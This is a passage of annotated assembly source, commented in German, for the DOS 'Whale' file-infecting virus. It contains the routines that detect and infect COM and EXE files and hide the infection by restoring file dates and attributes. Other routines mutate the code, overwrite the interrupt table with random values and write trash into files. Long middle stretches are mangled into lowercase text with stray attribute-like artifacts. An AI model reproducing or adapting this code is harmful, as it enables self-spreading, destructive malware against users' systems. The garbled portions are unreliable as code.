                DB      0E9h,0DBh,000
;-------------------------------( Nochmal Kontrolle, ob infiziert )---
J03428:         MDECODE 41
                MOV     AX,[SI]
                ADD     AX,[SI+02h]
                PUSH    BX
                MOV     BX,[SI+04h]

                XOR     BX,5348h   ; 'SH'
                XOR     BX,4649h   ; 'FI'

                ADD     AX,BX
                POP     BX
                MCODE   41
                JZ      J034AF                  ; ist schon infiziert
                PUSH    CS
                POP     DS
                MOV     DX,Offset Cmd_Line
                CALL    J039C3          ; ist die Datei ausfhrbar ?
                CALL    J043B1          ; Vorarbeiten
                INC     BYTE PTR CS:[D24EF]
                CALL    J03642          ; infizieren
                DEC     BYTE PTR CS:[D24EF]
;=====================================================================
;===================================( Datei im RAM wird gestartet )===
;=====================================================================
J0345F:         MDECODE 42

                MOV     AH,51h                  ; GET current PSP
                CALL    CS:[@INT21]

                CALL    SaveRegisters
                CALL    Patch_IBMDOS
                CALL    GetRegsFromVirstack
                MOV     DS,BX
                MOV     ES,BX
                PUSH    WORD PTR CS:[D24B3]     ; CALLERs FLAGS
                PUSH    WORD PTR CS:[D24E8]     ; Caller-CS
                PUSH    WORD PTR CS:[D24E6]     ; Caller-IP
                POP     Word Ptr DS:[000Ah]
                POP     Word Ptr DS:[000Ch]
                PUSH    DS
                MOV     AL,22h
                LDS     DX,Dword Ptr DS:[000Ah]
                CALL    SetInt_AL               ; SET INT 22 TO CALLER
                POP     DS
                POPF                            ; POP Original-Flags
                POP     AX                      ; POP RET-Adresse
                MOV     SP,CS:[D24FF]           ; SP-INIT
                MOV     SS,CS:[D2501]           ; SS-INIT
                MCODE   42
                JMP     DWORD PTR CS:[D2503]    ; EXEC Programm
;=====================================================================
;==============( Datei ist infiziert. Wal desinfiziert sie im RAM )===
;=====================================================================
;       Offset 100H     JMP     4BCC = E9 C9 4A
;       Offset 2814     EXE_ID         E9 pq rs , Savebytes
;       Offset 4BCC     Vir-Entry
;       2814-4AC9-100h = DC4B usw.
;=====================================================================
J034AF:         MDECODE 43                      ; SI zeigt auf COM-START
                MOV     BX,[SI+01h]             ; Sprungziel nach BX
                MOV     AX,[BX+SI+0DC4Bh]       ; -23B5, Diff -3  zw.
                MOV     [SI],AX                 ;  Savebytes und 4BCC
                MOV     AX,[BX+SI+0DC4Dh]       ; -23B3
                MOV     [SI+02h],AX
                MOV     AX,[BX+SI+0DC4Fh]       ; -2361
                MOV     [SI+04h],AX
                CALL    J045D0                  ; 'aktiv-msg'
                MCODE   43
                JMP     J0345F                  ;
;=====================================================================
;================================(   EINTRITT IN "ARBEITSPHASE"   )===
;================================( Durch die erste Anweisung wird )===
;================================( der JMP zum Relokator erzeugt  )===
;=====================================================================
J034D4:         MOV     BYTE PTR CS:[SI+SwapCode_2],0E9h
                                        ; JMP bei 3A20 erzeugen !!
                POP     BP              ; BP = 20h
                MOV     CX,0004h        ; Das n„chste RET macht wieder
                                        ; "PUSH BX,RET"
                MOV     BX,DS           ; BX = DS
                OR      BX,BP           ; BX = DS or 20h
                MOV     DS,BX           ; DS = DS or 20H

J034E4:         SHL     BX,1            ; BX = BX * 16
                LOOP    J034E4

                MOV     AX,CX           ; AX = 0
                MOV     CX,001Ch        ; CX = 1C

J034ED:         ADD     AH,[BX]
                INC     BX
                LOOP    J034ED

                PUSH    AX              ; AX auf den Stack
 
                MOV     CX,[BX]
                PUSH    CS
                POP     AX
                SHR     BH,1
                JMP     J03919
;=====================================================================
;================================================( Geh”rt zu EXEC )===
;=====================================================================
J034FC:         CMP     AL,01h  ; AX = 4B01 ( durch Debugger und Wal )
                JZ      J03510  ; ja  , durch Debugger und Wal.
                JMP     J02B8B  ; nein, AX=4B03. Low-int-21h rufen
;=====================================================================
;===========================================================(trash)===
;=====================================================================
J03503: DB      01,0cbh,81h,0fbh,34h,28h,72h,0f8h,81h,0f1h,21h,21h,0a1h
        ;---------------------------------------
        ;J03503:ADD     BX,CX
        ;       CMP     BX,2834h        ; OFFSET VIR_NAME
        ;       JB      J03503
        ;       XOR     CX,2121h        ; "!!"
        ;       MOV     AX,WORD PTR DS:[30E8h]
        ;       STD
        ;       SUB     [BX+SI],AL
        ;---------------------------------------
;=====================================================================
;==============================================( EXEC mit 4B01h   )===
;==============================================( Aufruf durch WAL )===
;==============================================( und Debugger     )===
;=====================================================================
J03510:         MDECODE 44
                OR      WORD PTR CS:[D24B3  ],+01h      ; CALLERS Flags
                MOV     Word ptr CS:[D2424+2],ES        ; EPB sichern
                MOV     Word ptr CS:[D2424  ],BX
                CALL    PopALL
                CALL    CS:[@INT21]           ; int 21h rufen
                CALL    PushALL
                LES     BX,DWord ptr CS:[D2424]         ; EPB zurck
                LDS     SI,DWord ptr ES:[BX+12h]        ; CS:IP holen
                MCODE   44
                JNB     J03542          ; ---> Infektion
                JMP     J035E0          ; ---> fertig
;=========================================================()========
J03542:         AND     BYTE PTR CS:[D24B3],0FEh; CF l”schen
                CMP     SI,+01h                 ; ist IP-INIT=1 (infiziert)
                JZ      J0358E
                MDECODE 45
                MOV     AX,[SI]
                ADD     AX,[SI+02h]
                PUSH    BX
                MOV     BX,[SI+04h]
                XOR     BX,5348h                ; "SH"
                XOR     BX,4649h                ; "FI"
                ADD     AX,BX
                POP     BX
                MCODE   45
                JNZ     J035C3          ; nicht markierbar, keine Infektion
                ;---------------------( Dateianfang manipulieren )---
                MDECODE 46
                MOV     BX,[SI+01h]
                MOV     AX,[BX+SI+0DC4Bh]       ; SIEHE 34af!
                MOV     [SI],AX
                MOV     AX,[BX+SI+0DC4Dh]
                MOV     [SI+02h],AX
                MOV     AX,[BX+SI+0DC4Fh]
                MOV     [SI+04h],AX
                MCODE   46
                JMP     SHORT J035C3    ; Terminate-Adresse festlegen

;=====================================================================
;=====================================( Datei ist schon infiziert )===
;=====================================================================
J0358E:         MDECODE 47                      ; ES:BX = EPB
                MOV     DX,WORD PTR DS:[001Ah]  ; DS:SI = CS:IP der Datei
                CALL    GET_Current_PSP

                MOV     CX,CS:[@PSP]
                ADD     CX,+10h
                ADD     DX,CX
                MOV     ES:[BX+14h],DX

                MOV     AX,Word Ptr DS:[0018h]
                MOV     ES:[BX+12h],AX

                MOV     AX,Word Ptr DS:[0012h]
                ADD     AX,CX
                MOV     ES:[BX+10h],AX

                MOV     AX,Word Ptr DS:[0014h]
                MOV     ES:[BX+0Eh],AX
                MCODE   47
;=====================================================================
;==============================( Installation des INT 22-Handlers )===
;=====================================================================
J035C3:         MDECODE 48
                CALL    GET_Current_PSP
                MOV     DS,CS:[@PSP]
                MOV     AX,[BP+02h]
                MOV     Word Ptr DS:[000Ah],AX  ; OFFSET int 22-Handler
                MOV     AX,[BP+04h]
                MOV     Word Ptr DS:[000Ch],AX  ; Segment int 22-Handler
                MCODE   48
J035E0:         JMP     J02EA3                  ; Fertig
;=====================================================================
;====================================( kann ja fast nicht sein ...)===
;=====================================================================
; erzeugt wird :
;       DB      01h
;       DW      CS
;       DW      SS
;       DW      SP
;--------------------------------------------------------------------
J035E3: MOV     WORD PTR CS:[023Ah],CS          ;2a4a
        MOV     WORD PTR CS:[023Ch],SS          ;2a4c
        MOV     WORD PTR CS:[023Eh],SP          ;2a4e
        MOV     BYTE PTR CS:[0239h],01h         ;2a49
        PUSH    DS
        POP     AX                              ; ist auch bloss Mll !
;=====================================================================
;=================================( Kontrolle des Verfalls-Datums )===
;=====================================================================
Check_Verfallsdatum:
                MDECODE 49
                CALL    PushALL
                MOV     AH,2Ah          ; GET System Time & Date
                CALL    CS:[@INT21]     ;
                CMP     CX,07C8h        ; 1992
                JNB     J0361A          ; CX >= 1992 : Setze [Error],1
                CMP     CX,07C7h        ; 1991
                JNZ     J03620          ; CX <> 1991 : Lasse [Error]
                CMP     DH,04h          ; April
                JB      J03620          ; DH < april="" :="" lasse="" [error]="" ;-----------------------------------------------------="" j0361a:="" mov="" byte="" ptr="" cs:[error],01h="" j03620:="" cmp="" byte="" ptr="" cs:[error],00h="" jz="" j0362f="" call="" popall="" pop="" ax="" jmp="" j03632="" ;--------------="" j0362f:="" call="" popall="" j03632:="" mcode="" 49="" cmp="" byte="" ptr="" cs:[error],00h="" jz="" j03641="" jmp="" j03761="" ;="" returnadresse="" bleibt="" auf="" stack...="" j03641:="" retn="" ;="====================================================================" ;="=================================(" "jmp="" decode_whale"="" schreiben="" )="==" ;="====================================================================" j03642:="" mdecode="" 50="" ;-------------------------------------------------------="" mov="" byte="" ptr="" cs:[0001h],0e9h="" ;="" jmp="" 23bc="" bcc="" mov="" byte="" ptr="" cs:[0002h],0b8h="" ;="" cs:0001="CS:2811" mov="" byte="" ptr="" cs:[0003h],023h="" ;--------------------------------------------------="" call="" trace_int_13h="" call="" j0378c="" ;="" errechnet="" unter="" anderem="" paras="" fr="" file="" ;="" si="ben”tigte" paragrafen="" ;="" cx="10h" ;="" dx:ax="Filesize" gerundet="" ;="" auf="" n„chsten="" paragrafen="" mov="" byte="" ptr="" ds:[offset="" exe_flag-offset="" virstart],01h="" cmp="" word="" ptr="" ds:[codbuf],'mz'="" mcode="" 50="" jz="" j0367e="" dec="" byte="" ptr="" ds:[offset="" exe_flag-offset="" virstart]="" jz="" j036f9="" ;="" wenn="" exe-flag="" "1"="" war,="" ;="" also="" immer="" (!)="" ;="====================================================================" ;="========================================(" exe-header="" auswerten="" )="==" ;="========================================(" infektion="" vorbereiten="" )="==" ;="====================(" die="" berechnung="" scheint="" fehlerhaft="" zu="" sein="" )="==" ;="====================================================================" j0367e:="" mdecode="" 51="" mov="" ax,word="" ptr="" ds:[codbuf+4]="" ;="" pages="" shl="" cx,1="" ;="" cx="20h" mul="" cx="" ;="" ax="" ist="" ((l„nge-1)="" div="" 200h)*20h="" ;="" also="" jetzt="" :="" (l„nge-1)="" div="" 10h="" ;="" ax="" enth„lt="" die="" ben”tigte="" anzahl="" ;="" paragrafen,="" um="" exe="" zu="" laden.="" add="" ax,0200h="" ;="" ax="AX+200h," gibt="" keinen="" sinn="" cmp="" ax,si="" ;="" vergleiche="" ax="" mit="" max-paras="" mcode="" 51="" jb="" j036f6="" ;="" jmp,="" wenn="" ax="" kleiner="" ist="" mov="" ax,word="" ptr="" ds:[codbuf+0ah]="" ;="" minfree="" or="" ax,word="" ptr="" ds:[codbuf+0ch]="" ;="" maxfree="" jz="" j036f6="" mdecode="" 52="" mov="" dx,word="" ptr="" ds:[filesize+2]="" mov="" cx,0200h="" mov="" ax,word="" ptr="" ds:[filesize="" ]="" div="" cx="" ;="" ax="(DX:AX)" 512;="" -=""> Pages
                OR      DX,DX           ; Blieb ein Rest ???
                MCODE   52
                JZ      J036B8          ; ja..
                INC     AX
J036B8:         MOV     WORD PTR DS:[CodBuf+2  ],DX     ; L„nge LastPage
                MOV     WORD PTR DS:[CodBuf+4  ],AX     ; Anzahl Pages
                CMP     WORD PTR DS:[CodBuf+14h],+01h   ; IP-Init = 1?
                JNZ     J036CA                          ; ( Whale !)
                JMP     J03761                          ; dann fertig !
;--------------------------------------------------------------------
                DB      0E8h
;--------------------------------------------------------------------
J036CA:         CALL    Check_Verfallsdatum
                MDECODE 53
                MOV     WORD PTR DS:[CodBuf+14h],0001h
                                                        ; IP-INIT = 0001h
                MOV     AX,SI                           ; MaxParas -> AX
                SUB     AX,WORD PTR DS:[CodBuf+8]       ; AX=AX-Headerparas
                MOV     WORD PTR DS:[CodBuf+16h ],AX    ; CS-INIT <-ax !!!!="" add="" word="" ptr="" ds:[codbuf+4="" ],+12h="" ;="" 12="" pages="" dazu="" ;="" (="=" whale-size="" )="" ;-----------------------------------------------------------="" ;="" eine="" andere="" art,="" ein="" virus="" zu="" entdecken="" :="" ;="" wenn="" ein="" exe="" wie="" ein="" com="" initialisiert="" wird...="" ;-----------------------------------------------------------="" mov="" word="" ptr="" ds:[codbuf+010h],0fffeh;="" sp-init="COM-LIKE" mov="" word="" ptr="" ds:[codbuf+="" 0eh],ax="" ;="" ss-init="CS-Init" mcode="" 53="" call="" infect_file="" j036f6:="" jmp="" j03761="" ;="====================================================================" ;="======================================(" verfahren="" fr="" com-files="" )="==" ;="====================================================================" j036f9:="" cmp="" si,0f00h="" ;="" com-size=""> 61440 Byte ?!?
                JNB     J03761          ; Dann geht es eben nicht ...

                ;--------------( merken der ersten 6 Byte des COM )---
                MDECODE 54
                MOV     AX,WORD PTR DS:[CodBuf  ] ; whale:
                MOV     WORD PTR DS:[0004h],AX    ; AX = 20CC
                ADD     DX,AX                     ; DX = 0, da COM
                MOV     AX,WORD PTR DS:[CodBuf+2]
                MOV     WORD PTR DS:[0006h],AX    ; AX = 0
                ADD     DX,AX                     ; DX = 20CC
                MOV     AX,WORD PTR DS:[CodBuf+4] ; AX = 0
                MOV     WORD PTR DS:[0008h],AX

                XOR     AX,5348h  ; 'SH' !!       ; AX = 5348
                XOR     AX,4649h  ; 'FI' !!       ; AX = 1501

                ADD     DX,AX                     ; DX = 35CD
                MCODE   54
                JZ      J03761     ; DX = 0 -> Keine Infektion ,
                                   ; File kann nicht markiert werden.

                MOV     AX,WORD PTR DS:[D24F2]  ; Hole Fileattribut
                AND     AL,04h                  ; Ist es SYSTEM ?
                JNZ     J03761                  ; jmp, wenn ja
                CALL    Check_Verfallsdatum

                MDECODE 55
                ;---------------------( JMP am COM-Start erzeugen )---
                MOV     CL,0E9h
                MOV     AX,0010h
                MOV     BYTE PTR DS:[CodBuf],CL
                MUL     SI                       ; AX = COM-L„nge in Byte,
                                                 ; auf ganzen Paragrafen
                                                 ; gerundet
                ADD     AX,23B9h                 ; So weit also + 3 Byte
                                                 ; zum De-Cryptor
                MOV     WORD PTR DS:[CodBuf+1],AX; hier also "JMP J04BCC"
                ;----------------------------------------------------
                ;-----------------( File als infiziert markieren )---
                ;----------------------------------------------------
                MOV     AX,WORD PTR DS:[CodBuf  ]; AX = C9E9
                ADD     AX,WORD PTR DS:[CodBuf+2]; AX = C9E9+004A =CA33
                NEG     AX                       ; AX = - AX = 35CD

                XOR     AX,4649h  ; 'FI' !!      ; AX = 7384
                XOR     AX,5348h  ; 'SH' !!      ; AX = 20CC (!!)

                MOV     WORD PTR DS:[CodBuf+4],AX; Siehe Label "start"
                MCODE   55
                CALL    Infect_File
;--------------------------------------( Ende der Infektionsphase )---
J03761:         MDECODE 56

                MOV     AH,3Eh                  ; CLOSE FILE
                CALL    CS:[@INT21]

                MOV     CX,CS:[D24F2]
                MOV     AX,4301h                ; Change File-Attribut
                MOV     DX,CS:[D24F4]           ; Offset Filename
                MOV     DS,CS:[D24F6]           ; Segment Filename

                CALL    CS:[@INT21]
                CALL    J048CD          ; RESET Int 13h und Int 24h
                MCODE   56              ; Alles ist so wie vorher...
                RETN
;=====================================================================
;====================================( Vorbereitung fr Infektion )===
;=====================================================================
J0378C:         MDECODE 57
                PUSH    CS
                MOV     AX,5700h                ; Get File-date
                POP     DS
                CALL    CS:[@INT21]

                MOV     WORD PTR DS:[FileTime],CX  ; Uhrzeit

                MOV     AX,4200h                ; SEEK Fileanfang
                MOV     Word Ptr DS:[FileDate],DX
                XOR     CX,CX
                XOR     DX,DX
                CALL    CS:[@INT21]

                MOV     AH,3Fh                  ; Read file
                MOV     DX,OFFSET CodBuf        ; nach DS:DX
                MOV     CL,1Ch                  ; 1C byte ( EXE-Header ! )
                CALL    CS:[@INT21]

                XOR     CX,CX                   ; Weils so schoen war ...
                MOV     AX,4200h
                XOR     DX,DX
                CALL    CS:[@INT21]

                MOV     CL,1Ch                  ; diesmal nach DS:0004 lesen
                MOV     AH,3Fh                  ; == CS:2814
                MOV     DX,0004h
                CALL    CS:[@INT21]

                XOR     CX,CX                   ; seek file-Ende
                MOV     AX,4202h
                MOV     DX,CX
                CALL    CS:[@INT21]

                MOV     Word Ptr DS:[FileSize+2],DX     ; FileSize merken
                MOV     Word Ptr DS:[FileSize  ],AX

                MOV     DI,AX           ; BEISPIEL : AX=9273 -> DI=9273
                ADD     AX,000Fh        ; AX=9282
                ADC     DX,+00h         ; šbertrag nach DX
                AND     AX,0FFF0h       ; AX=9280
                SUB     DI,AX           ; DI=FFF3
                MOV     CX,0010h        ; CX=10
                DIV     CX              ; AX=928 = Anzahl Paras fr File
                MOV     SI,AX           ; SI=928
                MCODE   57
                RETN
;=====================================================================
;=====================================================( Infektion )===
;=====================================================================
Infect_File:    MDECODE 58
;*****************************************
JMP CODE_58     ;************************* e-i-n-g-e-f--g-t-
;*****************************************

                XOR     CX,CX
                MOV     AX,4200h                ; SEEK File-Anfang
                MOV     DX,CX                   ; CX=DX=0
                CALL    CS:[@INT21]             ; INT 21h

                MOV     CL,1Ch                  ; 1C Byte
                MOV     AH,40h                  ; Write to File

                MOV     DX,Offset CodBuf        ; EXE-Header / COM-Start
                CALL    CS:[@INT21]             ; INT 21h

                MOV     AX,0010h
                MUL     SI                      ; AX = AX * maxparas
                MOV     CX,DX                   ; DX = Offset CodBuf
                MOV     DX,AX                   ;
                MOV     AX,4200h                ; SEEK from start to CX:DX
                CALL    CS:[@INT21]             ; INT 21h

                MOV     CX,Offset CodBuf        ; CX = CodBuf
                XOR     DX,DX                   ; DX = 0
                ADD     CX,DI                   ; CX = Offset CodBuf+DI

                MOV     AH,40h                  ; WRITE-FILE

                CALL    Mutate_Whale            ; Mutieren

                CALL    @10_Prozent             ; jedes 10. Mal Wal
                                                ; zerst”ren
                CALL    Suche_Fish              ; Jedes 4. Mal FISH.TBL
                                                ; schreiben

                MOV     BYTE Ptr DS:[InfectFlag],01h ; "habe infiziert"
                MOV     BYTE Ptr DS:[D2433],01h ; Verschlsseln, schreiben,
                                                ; entschlsseln !

                PUSH    BX
                PUSH    ES

                PUSH    CS
                POP     ES

                MOV     Word Ptr DS:[D2579],SI

                MOV     SI,OFFSET J0491A - Offset VirStart
                ;-----------------------------------------------------
                ;----------------------------( Wal-Code zerst”ren )---
                ;-----------------------------------------------------
                MOV     BYTE Ptr DS:[SwapCode_5],0CCh   ; 3259  , 0e8h
                MOV     BYTE Ptr DS:[SwapCode_2],0C6h   ; 3A20  , 0e9h
                MOV     BYTE Ptr DS:[SWAPCODE_6],0CCh   ; 2cff  , 0c3h
                ;-----------------------------------------------------
                CALL    Kill_Int_Table  ; nur eine einzige Infektion
Code_58:        MCODE   58              ; pro Session !
;=====================================================================
;============================================( Zerst”ren des Wals )===
;=====================================================================
                CALL    PATCH                   ; gepatchten code
                                                ; zerst”ren
                MOV     SI,SWAPCODE_4
                XOR     WORD Ptr DS:[SI],0EF15h ; PATCH zerst”ren
                ADD     SI,+02h
                XOR     WORD Ptr DS:[SI],4568h  ; ---""-----------
                MOV     BYTE Ptr DS:[SwapCode_1],03Dh
                                                ; DECODE zerst”ren
                ;=====( eigentliche infektion )=======================
                                           ;=========================;
                CALL    Code_Whale         ; Whale kodieren          ;
                                           ; aber NICHT Lauff„hig !! ;
                                           ;=========================;

                ;-------------------------( und rckg„ngig machen )---
                MOV     Byte Ptr DS:[SwapCode_1],0E9h
                XOR     WORD Ptr DS:[SI],4568h
                SUB     SI,+02h
                XOR     WORD Ptr DS:[SI],0EF15h
                ADD     SI,SwapCode_3                     ; SI = 210Ah
                CALL    PATCH
                ;=====================================================
                MDECODE 59
                MOV     SI,[D2579]
                POP     ES
                POP     BX
                CALL    Write_Trash_To_File

                MOV     CX,WORD PTR DS:[FileTime]

                MOV     AX,5701h                ; SET FILEDATUM !
                MOV     DX,WORD PTR DS:[FileDate]
                TEST    CH,80h                  ; Stunde > 16 ?
                JNZ     J038C3                  ; jmp, wenn nicht
                OR      BYTE PTR CS:[TrashFlag],00h
                JNZ     J038C3                  ; TrashFlag = "1" :jmp
                ADD     CH,80h                  ; Stunde=Stunde-16
J038C3:         CALL    CS:[@INT21]   ; Set Filedatum
CODE_59:
                MCODE   59
                RETN
;=====================================================================
;===========================( Den Whale-Code zerst”ren , bei der  )===
;===========================( Infektion jedes 10. COM-Files       )===
;===========================( Zweck :  Geburtenkontrolle !        )===
;=====================================================================
@10_Prozent:    MDECODE 60
                CALL    PushALL
                MOV     BYTE PTR CS:[TrashFlag],00h
                OR      BYTE Ptr CS:[Offset Exe_Flag-Offset VirStart],0
                JNZ     J0390E          ; Jmp, wenn EXE-File

                IN      AL,40h
                CMP     AL,19h          ; 90 % liegen ber 19h
                JNB     J0390E          ; fertig, nichts weiter tun
;-------------------------------------( Wal zerst”rt seinen Code )---
                INC     BYTE PTR CS:[TrashFlag]; ist jetzt "1"
                MOV     BX,000Ah
                MOV     CX,0016h

J038F4:         IN      AL,40h
                MOV     CS:[BX],AL      ; 16h Byte von CS:281A..2830
                INC     BX              ; durch Zufallszahlen berschreiben
                LOOP    J038F4
                IN      AL,40h
                MOV     BYTE PTR CS:[0001h],AL  ; dito den JMP bei CS:2811
                IN      AL,40h
                MOV     BYTE PTR CS:[0002h],AL
                IN      AL,40h
                MOV     BYTE PTR CS:[0003h],AL

J0390E:         CALL    PopALL
                MCODE   60
                RETN
;----------------------------------------------------
J03916:         DB      0E9H,09Dh,0F2H   ;JMP     J02BB6 => Nirwana
;--------------------------------------------------------------------
;------------------------------------------------------( Hmmmmm ) ---
;--------------------------------------------------------------------
J03919:         ;       JZ      J03916  ; => Nirwana !
                MOV     DX,DS           ; DX <- ds="" pop="" ax="" ;="" ax="20h" add="" dx,+10h="" ;="" dx="DS:100" mov="" ds,dx="" ;="" ds="DX" mov="" bx,[bx]="" ;="" bx:="0030:011C," das="" ist="" der="" neg="" bx="" ;="" tastaturpuffer="" (="" 40:1c)="" !="" add="" bx,cx="" ;="" es="" testet="" den="" tastaturpuffer="" ;********************************************************************="" cmp="" bx,bx="" ;****="" eingefšgt="" *************="" ;********************************************************************="" jnz="" j03936="" ;="" dann="" direkt="" in="" die="" dekode-routine="" ;="" mit="" si="" als="" returnadresse="" jz="" j03990="" ;="" sonst="" "decode"="" scharfmachen="" ;-------------------------------------------------(="" trash="" )---="" dw="" 00a72h="" dw="" 00b73h="" dw="" 0fee9h="" dw="" 0e9f2h="" dw="" 43h="" ;-------------------------------------------------------------="" j03936:="" jmp="" j02b87="" ;="push" si,="" jmp="" decode="" ;---------------------------------------------------------------------="" db="" 0e9h,06dh,0ah,0e9h,0a4h,0fch="" ;="====================================================================" ;="=======================================(" schreibt="" mll="" in="" datei="" )="==" ;="====================================================================" write_trash_to_file:="" mdecode="" 61="" call="" pushall="" or="" byte="" ptr="" cs:[trashflag],00h="" jz="" j0396a="" ;="" falls="" "0"="" nichts="" tun="" xor="" ax,ax="" in="" al,40h="" mov="" ds,ax="" mov="" dx,0400h="" ;="" dx="400h" in="" al,40h="" xchg="" ah,al="" in="" al,40h="" mov="" cx,ax="" and="" ch,0fh="" ;="" cx="0xxxh" mov="" ah,40h="" ;="" write="" file="" call="" cs:[@int21]="" j0396a:="" call="" popall="" mcode="" 61="" retn="" ;---------------------------------------------------------(="" trash="" )---="" db="" 0b9h,01ch,000h,089h="" db="" 0d7h,0b3h,000h,0e8h="" ;="=======================================================()===========" j0397a:="" mdecode="" 62="" call="" saveregisters="" mov="" di,dx="" add="" di,+0dh="" push="" ds="" pop="" es="" mcode="" 62="" jmp="" j039ec="" ;="" ist="" die="" datei="" ausfhrbar="" ;="====================================================================" ;="==========================================(" decode="" scharfmachen="" )="==" ;="====================================================================" j03990:="" mov="" byte="" ptr="" cs:[si+swapcode_1],0e9h;="" jmp="" erzeugen="" jmp="" j03a1c="" db="" 0eah="" ;="====================================================================" ;="=====================================(" zerst”rt="" die="" int-tabelle="" )="==" ;="====================================================================" kill_int_table:="" mdecode="" 63="" call="" pushall="" mov="" bx,23f1h="" ;="" 4c01="" mov="" cx,000eh="" ;="" cx="0Eh" push="" ax="" mov="" ax,0000h="" mov="" es,ax="" ;="" es="0000" pop="" ax="" j039af:="" in="" ax,40h="" ;="" hole="" zufallszahl="" mov="" si,ax="" push="" es:[si]="" ;="" zerstoere="" int-tabelle="" pop="" [bx]="" ;="" durch="" 14="" zufalls-werte="" !="" inc="" bx="" ;="" die="" in="" [bx]="" gemerkt="" werden="" loop="" j039af="" call="" popall="" mcode="" 63="" retn="" ;="====================================================================" ;="==================================(" check="" auf="" ausfhrbare="" datei="" )="==" ;="====================================================================" j039c3:="" mdecode="" 64="" call="" saveregisters="" push="" ds="" pop="" es="" mov="" cx,0050h="" mov="" di,dx="" mov="" bl,00h="" xor="" ax,ax="" cmp="" byte="" ptr="" ds:[di+01h],':'="" ;="" laufwerk="" im="" filenamen="" jnz="" j039e1="" mov="" bl,[di]="" ;="" ja,="" dann="" buchstabe="" nach="" bl="" and="" bl,1fh="" ;="" hex-zahl="" drausmachen="" j039e1:="" mov="" cs:[d2428],bl="" ;="" und="" in="" die="" drive-variable="" repnz="" scasb="" ;="" ende="" des="" filenamens="" suchen="" mcode="" 64="" ;---------------------------------------------------------------------="" ;---------------------------------(="" erkennung="" der="" datei-extension="" )---="" ;---------------------------------------------------------------------="" j039ec:="" mdecode="" 65="" mov="" ax,[di-03h]="" ;="" ende="" -="" 3,="" ist="" extension="" and="" ax,0dfdfh="" ;="" gross-schrift="" add="" ah,al="" mov="" al,[di-04h]="" and="" al,0dfh="" ;="" gross-schrift="" add="" al,ah="" mov="" byte="" ptr="" cs:[exe_flag],00h="" ;---------------------------------------------------------------------="" ;------------(="" angenommen,="" es="" war="" ein="" com,="" dann="" gilt="" :="" )-------------="" ;------------(="" and="" ax,0dfdf="" :="" ax="4D4F" 'mo'="" )-------------="" ;------------(="" add="" ah,al="" :="" ax="9C4F" )-------------="" ;------------(="" mov="" al,[di-4]:="" ax="9C43" 'xc'="" )-------------="" ;------------(="" add="" al,ah="" ;="" ax="9CDF" )-------------="" ;---------------------------------------------------------------------="" ;------------(="" bei="" exe="" kommt="" al="E2" heraus,="" bei="" com="" al="DF)-------------" ;---------------------------------------------------------------------="" cmp="" al,0dfh="" ;="" also="" :="" ist="" es="" ein="" com="" mcode="" 65="" j03a0c:="" jz="" j03a17="" inc="" byte="" ptr="" cs:[exe_flag]="" cmp="" al,0e2h="" ;="" also="" :="" ist="" es="" ein="" exe="" jnz="" j03a23="" ;="" weder="" com="" noch="" exe="" j03a17:="" call="" getregsfromvirstack="" ;="" com="" oder="" exe="" clc="" ;="" carry-flag="" l”schen="" retn="" ;="====================================================================" ;="===================================(" jmp="" wird="" zeitweise="" erzeugt="" )="==" ;="===================================(" einziger="" jmp="" zum="" relokator="" )="==" ;="====================================================================" j03a1c:="" xor="" ax,ax="" push="" es="" pop="" ds="" j03a20:="" jmp="" relokator="" ;="====================================================================" j03a23:="" call="" getregsfromvirstack="" ;="" weder="" com="" noch="" exe="" j03a26:="" stc="" ;="" carry-flag="" setzen="" retn="" db="" 2dh="" ;="====================================================================" ;="==============================================(" get="" current="" psp="" )="==" ;="====================================================================" get_current_psp:mdecode="" 66="" push="" bx="" mov="" ah,51h="" call="" cs:[@int21]="" mov="" cs:[@psp],bx="" pop="" bx="" mcode="" 66="" retn="" ;="====================================================================" ;="=========================(--------------------------------------)===" ;="=========================(" hier="" entstehen="" die="" mutanten="" !="" )="==" ;="=========================(--------------------------------------)===" ;="====================================================================" mutate_whale:="" mdecode="" 67="" call="" pushall="" ;="" ah="40h" !="" or="" byte="" ptr="" cs:[infectflag],00h="" ;="" hab="" schon="" infiziert="" !="" jnz="" j03a7c="" in="" al,40h="" ;="" zufallszahl="" holen="" cmp="" al,80h="" ;="" nur="" jedes="" 2="" mal="" arbeiten="" j03a55:="" jb="" j03a7c="" call="" decode_3a84="" ;="" bereich="" 3a84h...436ch="" j03a5a:="" in="" al,40h="" ;="" zufallszahl="" holen="" cmp="" al,1eh="" ;="" kleiner="" als="" 1eh="" 30d="" jnb="" j03a5a="" xor="" ah,ah="" mov="" bx,m_size="" mul="" bx="" ;="" zufallszahl="" *="" 4ch="" 76d="" ;="" ax="" :="" 0000....08e8="" add="" ax,offset="" j03a84-offset="" virstart="" ;="" ax="" :="" 1274....1b5c="" push="" cs="" push="" cs="" pop="" ds="" pop="" es="" ;="" es="DS=CS" ;="=====================" mov="" si,ax="" ;="" quelle="" :="" 1274....1b5c="" ;="" bzw.="" 3a84....436c="" ;="" in="" stcken="" zu="" 4ch="" !!!="" ;="=====================" mov="" di,offset="" d4bb5-offset="" virstart="" mov="" cx,m_size="" ;="" 4c="" byte="" von="" cs:si="" ;="" nach="" cs:23a5/4bb5="" ;="" schaufeln="" cld="" repz="" movsb="" call="" code_3a84="" ;="" bereich="" 3a84h...436ch="" j03a7c:="" call="" popall="" mcode="" 67="" retn="" ;="================================(" dieser="" code="" steht="" immer="" davor="" )="==" ;code_whale:="" push="" cx="" ;="" push="" bx="" ;="" mov="" bx,firstbyte="" ;="" mov="" cx,code_len="" ;="" 2385h="" ;="" wal-size="" bis="" j04bb5="" ;="====================================================================" ;="" die="" nummerierung="" der="" mutanten="" folgt="" dem="" tbscan.dat-file="" ;="====================================================================" ;="====================================================(" mutant="" #="" 3)="==" ;="====================================================================" mut_3="" equ="" $="" j03a84:="" std="" ;="OFFSET" 4bb5="" mov="" cx,dreibyte="" ;="" 0bd8h="" j03a88:="" xor="" word="" ptr="" ds:[bx],1326h="" add="" bx,+03h="" loop="" j03a88="" mov="" cx,bx="" pop="" cx="" mov="" bx,cx="" pop="" cx="" mov="" ah,60h="" jmp="" short="" j03ab8="" ;--------(="" einsprung="" )="" ---------(="" -1131="" )------------="" j03a9b:="" push="" si="" ;="4BCC," si="100h" call="" j03aa1="" ;="" dw="" 6945h="" ;="" 4bd0="" j03aa1:="" pop="" dx="" ;="" dx="4BD0" push="" cs="" sub="" dx,23a0h="" ;="" dx="2830" pop="" ds="" mov="" cx,dreibyte="" ;="" cx="0BD8" xchg="" dx,si="" ;="" dx="100h," si="2830" j03aad:="" xor="" word="" ptr="" ds:[si],1326h="" add="" si,+03h="" loop="" 